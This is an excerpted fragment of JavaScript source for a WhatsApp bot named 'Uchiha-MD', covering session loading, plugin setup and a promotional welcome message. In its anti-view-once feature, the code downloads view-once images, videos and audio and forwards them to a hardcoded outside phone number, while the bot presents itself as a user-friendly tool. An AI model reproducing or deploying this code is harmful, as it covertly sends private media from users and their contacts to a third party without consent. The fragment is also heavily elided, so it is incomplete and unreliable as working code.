...
const sessdata = config.SESSION_ID.replace("Uchiha~", '');
...
console.log("Session downloaded ✅")
  ...
  console.log("Connecting Uchiha-MD to WhatsApp ⏳️...");
  ...
  console.log('🧬 Installing uchiha-md Plugins')
  const path = require('path');
  ...
  let up = `*Hello there ✦ Uchiha ✦✦ MD ✦ User! \ud83d\udc4b\ud83c\udffb* \n\n> This is a user friendly whatsapp bot created by  reincarnated uchiha \ud83c\udf8a, Meet ✦ uchiha ✦✦ MD ✦ WhatsApp Bot.\n\n *Thanks for using ✦ Uchiha ✦✦ MD ✦ \ud83d\udea9* \n\n> follow WhatsApp Channel :- 💖\n \nhttps://www.whatsapp.com/channel/0029Vayffwg3rZZiMjoycd1z\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/saddemon1185/uchiha-md\n\n> © Powered BY ✦ uchiha ✦✦ MD ✦ \ud83d\udda4`;
  conn.sendMessage(conn.user.id, { image: { url: `https://imgur.com/1gllAPq.jpeg` }, caption: up })
  }
  })
  ...
  if (jawadik && config.ANTI_VV === "true") {
    ...
    return conn.sendMessage("254757959246@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
    ...
    return conn.sendMessage("254757959246@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
  } if (jawadik.message.audioMessage) {
    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
    return conn.sendMessage("254757959246@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
  }
  }
  ...
  */
  ...
  if(senderNumber.includes("254757959246")){
  if(isReact) return
  m.react("🦄")
  }
